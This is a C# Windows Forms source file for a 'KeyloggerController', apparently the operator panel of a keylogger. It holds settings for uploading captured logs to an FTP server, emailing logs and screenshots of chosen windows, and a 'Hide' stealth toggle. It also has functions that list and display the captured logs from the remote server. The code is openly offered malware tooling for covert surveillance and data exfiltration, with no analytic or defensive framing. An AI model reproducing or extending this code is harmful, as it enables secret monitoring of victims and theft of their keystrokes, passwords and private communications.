using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace KeyloggerController
{
    public partial class Form1 : Form
    {
        private string strHost;
        private string strUser;
        private string strPass;

        private static string strFromEmail, strEmailHost, strEmailPass;
        private static int intEmailPort;
        private string strReceipentUser;
        private string strScreenshotWindow;

        private bool blTakeScreenshot;
        private bool blSpecificLogging;
        private bool blSendEmail;
        private bool blUploadFTP;

        private bool blStartLog;
        private bool blHide;

        private static classJsonObj.classJson objJson;

        public Form1()
        {
            InitializeComponent();
            doFirst();

        }

        public void doFirst()
        {
            objJson = classJsonObj.initializeObj();

            getSettings();
            getControls();
            setControls();
            refreshLogs();

            backgroundWorker1.RunWorkerAsync();
        }

        public void getSettings()
        {
            strHost = objJson.FTP.Host;
            strUser = objJson.FTP.User;
            strPass = objJson.FTP.Pass;

            strEmailHost = objJson.Email.Host;
            strFromEmail = objJson.Email.FromEmail;
            intEmailPort = objJson.Email.Port;
            strEmailPass = objJson.Email.Pass;
            strReceipentUser = objJson.Email.ToEmail;
            strScreenshotWindow = objJson.Email.Window;

            blTakeScreenshot = objJson.Check.TakeScreenshot;
            blSpecificLogging = objJson.Check.SpecificLogging;
            blSendEmail = objJson.Check.SendEmail;
            blUploadFTP = objJson.Check.UploadFTP;
            blStartLog = objJson.Check.Start;
            blHide = objJson.Check.Hide;
        }

        public void setControls()
        {
            txtFTPHost.Text = strHost;
            txtFTPUser.Text = strUser;
            txtFTPPass.Text = strPass;

            txtEmailHost.Text = strEmailHost;
            txtEmailFrom.Text = strFromEmail;
            txtEmailPort.Text = intEmailPort.ToString();
            txtEmailPass.Text = strEmailPass;
            txtEmailTo.Text = strReceipentUser;
            txtScreenshotWindow.Text = strScreenshotWindow;

            checkScreenshot.Checked = blTakeScreenshot;
            checkSpecific.Checked = blSpecificLogging;
            checkEmail.Checked = blSendEmail;
            checkFTP.Checked = blUploadFTP;
            checkHide.Checked = blHide;
        }

        public void setSettings()
        {
            objJson.FTP.Host = strHost;
            objJson.FTP.User = strUser;
            objJson.FTP.Pass = strPass;

            objJson.Email.Host = strEmailHost;
            objJson.Email.FromEmail = strFromEmail;
            objJson.Email.Port = intEmailPort;
            objJson.Email.Pass = strEmailPass;
            objJson.Email.ToEmail = strReceipentUser;
            objJson.Email.Window = strScreenshotWindow;

            objJson.Check.TakeScreenshot = blTakeScreenshot;
            objJson.Check.SpecificLogging = blSpecificLogging;
            objJson.Check.SendEmail = blSendEmail;
            objJson.Check.UploadFTP = blUploadFTP;
            objJson.Check.Start = blStartLog;
            objJson.Check.Hide = blHide;

            if (blStartLog == true)
            {
                statusChanger("Started");
            }
            else
            {
                statusChanger("Stopped");
            }        
        }

        public void getControls()
        {
            grpEmail.Enabled = blSendEmail;
            checkScreenshot.Enabled = blSendEmail;
            checkSpecific.Enabled = blSendEmail;

            if ((blTakeScreenshot == true) || (blSpecificLogging == true))
            {
                txtScreenshotWindow.Enabled = true;
            }
            else
            {
                txtScreenshotWindow.Enabled = false;
            }
        }

        public void refreshLogs()
        {
            classFTP.getLogs(lstLogs, strHost, strUser, strPass);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            blStartLog = true;
            btnStop.Enabled = true;
            btnStart.Enabled = false;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            blStartLog = false;
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        private void statusChanger(String Status)
        {
            if (Status.Equals("Started"))
            {
                statusStrip1.BackColor = Color.LimeGreen;
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }
            else if (Status.Equals("Stopped"))
            {
                statusStrip1.BackColor = Color.Red;
                btnStart.Enabled = true;
                btnStop.Enabled = false;
            }
        }

        private void btnValidateFTP_Click(object sender, EventArgs e)
        {
            checkFTP.Enabled = classFTP.validateFTP(strHost, strUser, strPass);
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                setSettings();
                classJsonObj.exportObj(objJson);
                Thread.Sleep(1000);
            }
        }

        private void checkFTP_CheckedChanged(object sender, EventArgs e)
        {
            blUploadFTP = checkFTP.Checked;         
        }

        private void checkEmail_CheckedChanged(object sender, EventArgs e)
        {
            blSendEmail = checkEmail.Checked;
            checkScreenshot.Enabled = blSendEmail;
            checkSpecific.Enabled = blSendEmail;
            grpEmail.Enabled = blSendEmail;
        }

        private void checkScreenshot_CheckedChanged(object sender, EventArgs e)
        {
            blTakeScreenshot = checkScreenshot.Checked;
            txtScreenshotWindow.Enabled = blTakeScreenshot;
        }

        private void checkSpecific_CheckedChanged(object sender, EventArgs e)
        {
            blSpecificLogging = checkSpecific.Checked;
            txtScreenshotWindow.Enabled = blSpecificLogging;
        }

        private void checkHide_CheckedChanged(object sender, EventArgs e)
        {
            blHide = checkHide.Checked;
        }

        private void txtFTPUser_TextChanged(object sender, EventArgs e)
        {
            strUser = txtFTPUser.Text;
        }

        private void txtFTPHost_TextChanged(object sender, EventArgs e)
        {
            strHost = txtFTPHost.Text;
        }

        private void txtFTPPass_TextChanged(object sender, EventArgs e)
        {
            strPass = txtFTPPass.Text;
        }

        private void txtEmailHost_TextChanged(object sender, EventArgs e)
        {
            strEmailHost = txtEmailHost.Text;
        }

        private void txtEmailFrom_TextChanged(object sender, EventArgs e)
        {
            strFromEmail = txtEmailFrom.Text;
        }

        private void txtEmailPort_TextChanged(object sender, EventArgs e)
        {
            intEmailPort = int.Parse(txtEmailPort.Text);
        }

        private void txtEmailPass_TextChanged(object sender, EventArgs e)
        {
            strEmailPass = txtEmailPass.Text;
        }

        private void txtEmailTo_TextChanged(object sender, EventArgs e)
        {
            strReceipentUser = txtEmailTo.Text;
        }

        private void txtScreenshotWindow_TextChanged(object sender, EventArgs e)
        {
            strScreenshotWindow = txtScreenshotWindow.Text;
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            refreshLogs();
        }

        private void lstLogs_DoubleClick(object sender, EventArgs e)
        {
            viewLog();   
        }

        private void viewLog()
        {
            if ((lstLogs.Items.Count > 0) && (lstLogs.SelectedIndex != -1))
            {
                string strLogName = lstLogs.SelectedItem.ToString();
                MessageBox.Show(classFTP.viewLog(strLogName, strHost, strUser, strPass), strLogName);
            }
        }
    }
}
